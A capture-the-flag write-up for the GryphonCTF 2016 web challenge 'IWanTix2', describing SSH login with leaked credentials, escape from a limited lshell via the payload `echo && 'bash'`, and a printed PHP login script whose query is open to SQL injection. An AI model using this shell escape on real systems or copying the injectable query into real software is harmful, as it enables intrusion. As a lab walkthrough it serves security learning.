# GryphonCTF_2016: IWanTix2

**Category:** Web
**Points:** 30
**Description:**

>Get into the organiser's network and generate tickets so you can sell it at a very low price to our dear admin QR!
Play at http://play.spgame.site:8002
Creator - Kelvin Neo (@deathline75)
Creator - Chen Qiurong (@pc84560895)

## Write-up
This time around, we are given a url that leads to a very snarky reply by the web server.

    Didn't your parents tell you not to look at unauthorised pages?

    Unless you are an administrator, then please login locally.

Opening up Developer's Console in Chrome reveals a delicious header.

    Credentials:Look out for port 8001,user:webadmin,pass:webadmin

Connecting to port 8001 via browser, you get nothing! Or a weird OpenSSH version header anyways. So, we try to connect to it via shell.

    $ ssh webadmin@play.spgame.site -p 8001
    webadmin@play.spgame.site's password: 

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Wed Oct 12 14:55:07 2016 from 103.26.223.115
    You are in a limited shell.
    Type '?' or 'help' to get the list of allowed commands
    webadmin:~$ 

Viola! Well, now we are in a limited shell. What do we do now? Hmm...

    webadmin:~$ ?
    clear  exit  help  history  lpath  lsudo
    webadmin:~$ 

Upon further researching, it appears we are in a limited shell, or lshell, in short. Doing some research on CVEs, we find an [exploit](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=834949) for lshell.

    webadmin:~$ echo && 'bash'
    webadmin@c8664621541c:~$

Woah there!

    webadmin@c8664621541c:/var/www/html$ cat .htaccess 
    Header set Credentials "Look out for port 8001,user:webadmin,pass:webadmin"
    ErrorDocument 403 /403.html
    order deny,allow
    deny from all
    allow from 127.0.0.1 localhost
    webadmin@c8664621541c:/var/www/html$ cat index.php 
    <html>

    <body>
    <p>
        Welcome to the Eason Chan concert ticket generator
        <br />
        Submit the right secret key to get access to it!
    </p>
    <form action='login.php' method='post'>
    Secret Key:<input type='password' name=secret_key> 
    <input type='submit' value='Enter'>
    </body>


    </html>
    webadmin@c8664621541c:/var/www/html$ cat login.php 
    <?php

    $servername = "db-iwantix2";
    $username = "iwantix2";
    $password = "iwantix22";
    $dbname = "iwantix2";

    $conn = new mysqli($servername, $username, $password,$dbname);

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    } 

    # Get POST Request..
    $secret_key = $_POST['secret_key'];

    $sql = "SELECT * from secret_key where secretkey = '$secret_key'";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            echo 'Nice! You can generate as many tickets as you want now!!<br />';
            echo "Here's your flag! You're most welcome.<br />";
            echo "GCTF{7unn3l_4nd_1nj3c7}";
        }
    } else {
        echo "Hahahahaha! No! You cannot generate ticket!";
    }


    ?>

Epic motherload right there.
Therefore, the flag is `GCTF{7unn3l_4nd_1nj3c7}`.

EDIT: This was actually a bug and team JEAM was awarded 3 points for the discovery and report of this bug. _What misers the organizers are_.
EDIT2: This was supposd to be solved via `ssh webadmin@play.spgame.site -p 8001 -L 1337:localhost:8002`, accessing `localhost:1337` and injecting SQLi code. Well, I think my method was abit more epic.
